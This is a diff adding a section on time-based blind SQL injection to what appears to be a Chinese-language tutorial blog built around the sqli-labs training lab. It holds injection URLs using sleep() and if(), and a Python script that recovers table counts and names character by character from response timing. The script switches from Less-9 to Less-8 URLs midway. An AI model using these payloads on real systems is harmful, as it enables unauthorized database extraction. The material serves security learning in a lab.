@@ -476,6 +476,124 @@ for c in range(0,count):
 
 <img src="/images/sql_12.png">
 
+<h4>Time based blind injection</h4>
+
+上面学完了基于bool的盲注，还有一种盲注基于时间的盲注。
+
+这种盲注主要出现在，在注入时页面没有返回或者不管true还是false看到的页面结果都是一样的。
+
+那么就可以利用时间来判断是否成功执行了语句。
+
+主要用到两个内置函数:
+
+<code>sleep()</code>
+
+<code>if(expr1,expr2,expr3)</code>
+
+用法：
+
+sleep(5) 就表示等待5s。
+
+if()中的三个参数，若expr1为true，那么就执行expr2，否则就执行expr3。
+
+<h4>Example</h4>
+
+<h4>Less-9 Blind time-based</h4>
+
+在less-9中，提供的就是time-based类的盲注。
+
+例如:http://192.168.1.106/sqli-labs/Less-9/?id=1%27%20and%201 --+
+
+和:http://192.168.1.106/sqli-labs/Less-9/?id=1%27%20and%200 --+
+
+返回的结果都一样。
+
+利用前面讲的两个函数：
+
+构造一下:
+
+http://192.168.1.106/sqli-labs/Less-9/?id=1%27%20and%20if((select%20database())=%27security%27,sleep(3),null)--+
+
+解释一下:在and后面接一个bool值，里面的内容是如果database()=security，那么则会执行sleep(3)
+否则就执行null。很明显，如果我们盲注正确的话，就会sleep 3s。
+
+配合bool盲注里面的substr和length，一个一个的猜字符。
+
+例如:猜数据库的表数
+
+http://192.168.1.106/sqli-labs/Less-9/?id=1' and if((select count(*) from information_schema.tables where table_schema=database())=4,sleep(3),null) --+
+
+数据库的表个数为4，那么页面就会在载入状态等待4s。
+
+python的脚本：
+
+{% highlight python %}
+# -*- coding: utf-8 -*-
+import requests
+import time
+
+url1 = "http://192.168.1.106/sqli-labs/Less-9/?id=1' and if((select count(*) from information_schema.tables where table_schema=database())=%d,sleep(0.3),null) --+"
+
+count = 0
+
+for x in range(1,100):
+	test_url = url1 % (x)
+	start = time.time()
+	r = requests.get(test_url)
+	end = time.time()
+	if (end-start) > 0.3:
+		count = x
+		break
+
+print count,"tables"
+
+for c in range(0,count):
+	url="http://192.168.1.106/sqli-labs/Less-8/?id=9' and if((select substr((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1))='%s',sleep(0.3),null) --+"
+	
+	url2="http://192.168.1.106/sqli-labs/Less-8/?id=9' and if((select length(table_name) from information_schema.tables where table_schema=database() limit %d,1 )=%d,sleep(0.3),null) --+"
+
+	length =0
+	for l in range(1,100):
+		test_url=url2 % (c,l)
+		start = time.time()
+		r = requests.get(test_url)
+		end = time.time()
+		if (end-start) > 0.3:
+			length = l		
+			break	
+
+	print "the table name length:",length
+
+	result = ""
+	for x in range(1,length+1):
+		flag=True
+		for i in range(ord('a'),ord('z')+1):
+			if(flag == False):
+				break
+			test_url = url % (c,x,chr(i))
+			start = time.time()
+			r = requests.get(test_url)
+			end = time.time()
+			if (end-start) > 0.3:
+				result = result + chr(i)
+				flag = False
+		for i in range(ord('A'),ord('Z')+1):
+			if(flag == False):
+				break
+			test_url = url % (c,x,chr(i))
+			start = time.time()
+			r = requests.get(test_url)
+			end = time.time()
+			if (end-start) > 0.3:
+				result = result + chr(i)
+				flag = False
+	print result
+{% endhighlight%}
+
+结果和上面bool盲注的一样。
+
+<img src="/images/sql_13.png" alt="">
+
 <code>...待续</code>
 
 EOF
